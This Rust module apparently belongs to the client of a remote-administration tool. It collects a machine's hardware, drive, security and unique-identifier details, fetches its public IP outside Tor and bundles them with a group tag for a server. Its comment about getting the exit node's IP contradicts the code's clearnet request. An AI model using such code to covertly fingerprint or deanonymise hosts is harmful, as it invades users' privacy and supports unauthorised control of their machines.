pub mod bios;
pub mod cpu;
pub mod gpu;
pub mod ram;
pub mod system;
pub mod security;
pub mod drives;
pub mod unique;
pub mod displays;

use common::client_info::{ClientInfo, ClientData};

/// Fetch the client's real public IP via my-ip.io.
/// Goes through the clearnet (not Tor) so we get the exit node's IP when
/// connecting via Tor, which is what the server needs for display/GeoIP.
/// Returns None on any error so the server falls back to socket address.
async fn fetch_public_ip() -> Option<String> {
    let client = reqwest::Client::builder()
        .timeout(std::time::Duration::from_secs(8))
        .build()
        .ok()?;

    #[derive(serde::Deserialize)]
    struct MyIpResponse {
        ip: String,
    }

    let resp = client
        .get("https://api.my-ip.io/v2/ip.json")
        .header("Accept", "application/json")
        .send()
        .await
        .ok()?;

    let body: MyIpResponse = resp.json().await.ok()?;
    Some(body.ip)
}

pub async fn client_info(group: String) -> ClientInfo {
    // Fetch public IP concurrently with the other collectors
    let (
        public_ip,
        system_info,
        ram_info,
        cpu_info,
        bios_info,
        gpus_info,
        drives_info,
        unique_info,
        security_info,
    ) = tokio::join!(
        fetch_public_ip(),
        system::collect_system_info(),
        ram::collect_ram_info(),
        cpu::collect_cpu_info(),
        bios::collect_bios_info(),
        gpu::collect_gpu_info(),
        drives::collect_physical_drives(),
        unique::collect_unique_info(),
        security::collect_security_info(),
    );

    let displays_info = displays::get_display_count();

    let mut client_data = ClientData::init(group);
    client_data.addr = public_ip; // None → server falls back to socket addr

    ClientInfo {
        data: client_data,
        system: system_info,
        ram: ram_info,
        cpu: cpu_info,
        bios: bios_info,
        gpus: gpus_info,
        displays: displays_info,
        drives: drives_info,
        unique: unique_info,
        security: security_info,
    }
}